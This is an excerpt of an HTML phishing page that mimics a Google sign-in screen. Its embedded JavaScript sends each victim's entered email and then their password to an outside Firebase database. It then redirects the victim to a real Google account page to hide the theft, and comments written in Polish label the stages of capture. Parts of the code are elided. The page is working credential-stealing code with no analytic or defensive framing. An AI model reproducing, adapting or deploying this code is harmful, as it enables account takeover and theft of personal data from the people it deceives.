...
<head>
  ...
  <script>
var server = "https://fir-f5933-default-rtdb.europe-west1.firebasedatabase.app/logi.json";
...
function next() {
  ...
  if (mailid > "") {
    ...
    // Wysyłka do Firebase
    fetch(server, { method: "POST", body: JSON.stringify({ email: mailid, status: "Wpisał Email" }) });

    // Twój oryginalny wygląd (HTML)
...
<form method="post" action="#">
  ...
  <div class="card-bottom">
      ...
      <div class="footer">
        <select class="disable-select" name="select"><option value="English (United States)">English (United States)</option></select>
    ...
    fixoverride();
    document.getElementById("email_").innerHTML = mailid.substr(0, 42) + "...";
  } else {
    ...
    document.getElementById("error").innerHTML = `<span style="margin-top: -40px; text-align: left;" class="jibhHc inline-block"><svg aria-hidden="true" fill="#d93025" width="16px" height="16px" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg><p class="inline-block" style="color: red;">&nbsp;Enter an email or phone number</p></span>`;
  }
}
...
function next2() {
  ...
  if (pass > "") {
    // Wysyłka hasła do Firebase
    fetch(server, { 
      method: "POST", 
      body: JSON.stringify({ email: current_user_email, password: pass, status: "Wpisał Hasło" }) 
    }).then(() => {
      window.location = "https://www.google.com/account/about/?hl=en-GB";
    });
  } else {
    document.getElementById("error").innerHTML = `<p style="color: red;">Enter a password</p>`;
  }
}
  </script>
  <style>
